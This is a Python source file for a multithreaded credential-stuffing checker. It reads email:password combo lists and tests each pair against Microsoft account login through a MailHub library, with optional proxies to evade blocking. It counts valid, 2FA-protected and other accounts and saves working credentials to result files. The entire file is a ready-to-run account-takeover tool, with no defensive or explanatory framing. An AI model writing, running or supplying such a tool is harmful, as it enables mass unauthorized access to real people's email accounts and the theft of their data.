import os
import sys
from datetime import datetime
from mailhub import MailHub
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

print_lock = Lock()
file_lock = Lock()
stats_lock = Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_combos(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            combos = [line.strip() for line in f if line.strip() and ':' in line]
        return combos
    except FileNotFoundError:
        print(f"{Colors.RED}[ERROR] File '{filename}' not found!{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] Creating empty combos.txt file...{Colors.RESET}")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("")
        return []
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Failed to read file: {str(e)}{Colors.RESET}")
        return []

def save_result(filename, content):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            with file_lock:
                os.makedirs('results', exist_ok=True)
                filepath = os.path.join('results', filename)
                with open(filepath, 'a', encoding='utf-8') as f:
                    f.write(content + '\n')
                    f.flush()
                    os.fsync(f.fileno())
            return True
        except Exception as e:
            if attempt == max_retries - 1:
                with print_lock:
                    print(f"\n{Colors.RED}[ERROR] Failed to save result after {max_retries} attempts: {str(e)}{Colors.RESET}")
            time.sleep(0.1)
    return False

def check_account(checker, email, password, proxy=None):
    try:
        result = checker.loginMICROSOFT(email, password, proxy)
        
        if result[0] == "ok":
            return "HIT", result[1] if len(result) > 1 else None
        elif result[0] == "nfa":
            return "2FA", None
        elif result[0] == "custom":
            return "CUSTOM", None
        elif result[0] == "fail":
            return "BAD", None
        else:
            return "BAD", None
            
    except Exception as e:
        return "BAD", str(e)

def print_stats_line(stats, start_time):
    with stats_lock:
        elapsed = time.time() - start_time
        cpm = (stats['checked'] / elapsed * 60) if elapsed > 0 else 0
        
        line = (f"\r{Colors.CYAN}Progress: {stats['checked']}/{stats['total']}{Colors.RESET} | "
                f"{Colors.GREEN}Hits: {stats['hits']}{Colors.RESET} | "
                f"{Colors.YELLOW}2FA: {stats['2fa']}{Colors.RESET} | "
                f"{Colors.MAGENTA}Custom: {stats['custom']}{Colors.RESET} | "
                f"{Colors.RED}Bad: {stats['bad']}{Colors.RESET} | "
                f"{Colors.CYAN}CPM: {cpm:.0f}{Colors.RESET}")
        print(line, end='', flush=True)

def process_combo(combo, proxy, index, total, stats, timestamp, start_time):
    checker = None
    try:
        email, password = combo.split(':', 1)
        checker = MailHub()
        
        status, extra = check_account(checker, email, password, proxy)
        
        with stats_lock:
            stats['checked'] += 1
            
            result_line = f'{combo}'
            
            if status == "HIT":
                stats['hits'] += 1
                save_result(f'hits_{timestamp}.txt', result_line)
                
            elif status == "2FA":
                stats['2fa'] += 1
                save_result(f'2fa_{timestamp}.txt', result_line)
                
            elif status == "CUSTOM":
                stats['custom'] += 1
                save_result(f'custom_{timestamp}.txt', result_line)
                
            elif status == "BAD":
                stats['bad'] += 1
        
        print_stats_line(stats, start_time)
            
    except ValueError:
        with stats_lock:
            stats['bad'] += 1
        print_stats_line(stats, start_time)
    except Exception as e:
        with stats_lock:
            stats['bad'] += 1
        print_stats_line(stats, start_time)
    finally:
        if checker:
            del checker

def run_checker():
    clear_screen()
    
    combo_file = "combos.txt"
    
    print(f"{Colors.BLUE}[*] Loading combos from {combo_file}...{Colors.RESET}")
    combos = load_combos(combo_file)
    
    if not combos:
        print(f"{Colors.RED}[!] No valid combos found in combos.txt{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Please add your combos and run again{Colors.RESET}")
        input(f"\n{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        return
    
    print(f"{Colors.GREEN}[✓] Loaded {len(combos)} combos{Colors.RESET}")
    
    threads_input = input(f"{Colors.YELLOW}Number of threads: {Colors.RESET}").strip()
    try:
        threads = int(threads_input) if threads_input else 10
        threads = max(1, min(threads, 200))
    except ValueError:
        threads = 10
    
    print(f"{Colors.GREEN}[✓] Using {threads} threads{Colors.RESET}")
    
    use_proxy = input(f"{Colors.YELLOW}Use proxies? (y/n): {Colors.RESET}").strip().lower()
    proxy = None
    
    if use_proxy == 'y':
        proxy_input = input(f"{Colors.YELLOW}Enter proxy: {Colors.RESET}").strip()
        if proxy_input:
            proxy = {
                'http': proxy_input,
                'https': proxy_input
            }
            print(f"{Colors.GREEN}[✓] Proxy configured{Colors.RESET}")
    
    stats = {
        'total': len(combos),
        'checked': 0,
        'hits': 0,
        '2fa': 0,
        'custom': 0,
        'bad': 0
    }
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    print(f"\n{Colors.CYAN}Starting check...{Colors.RESET}\n")
    
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i, combo in enumerate(combos, 1):
                future = executor.submit(
                    process_combo, 
                    combo, 
                    proxy, 
                    i, 
                    stats['total'], 
                    stats, 
                    timestamp,
                    start_time
                )
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Checker stopped by user{Colors.RESET}")
    
    end_time = time.time()
    elapsed = end_time - start_time
    cpm = (stats['checked'] / elapsed * 60) if elapsed > 0 else 0
    
    print(f"\n\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}Checking Complete!{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}\n")
    
    print(f"{Colors.WHITE}Time Elapsed:    {elapsed:.2f} seconds{Colors.RESET}")
    print(f"{Colors.WHITE}CPM:             {cpm:.0f}{Colors.RESET}")
    print(f"{Colors.WHITE}Total Checked:   {stats['checked']}/{stats['total']}{Colors.RESET}")
    print(f"{Colors.GREEN}Hits:            {stats['hits']}{Colors.RESET}")
    print(f"{Colors.YELLOW}2FA:             {stats['2fa']}{Colors.RESET}")
    print(f"{Colors.MAGENTA}Custom:          {stats['custom']}{Colors.RESET}")
    print(f"{Colors.RED}Bad:             {stats['bad']}{Colors.RESET}\n")
    
    if stats['hits'] > 0 or stats['2fa'] > 0 or stats['custom'] > 0:
        print(f"{Colors.GREEN}[✓] Results saved in 'results/' folder{Colors.RESET}\n")
    
    input(f"{Colors.WHITE}Press Enter to exit...{Colors.RESET}")

if __name__ == "__main__":
    try:
        run_checker()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program terminated by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] Unexpected error: {str(e)}{Colors.RESET}")
        input(f"{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        sys.exit(1)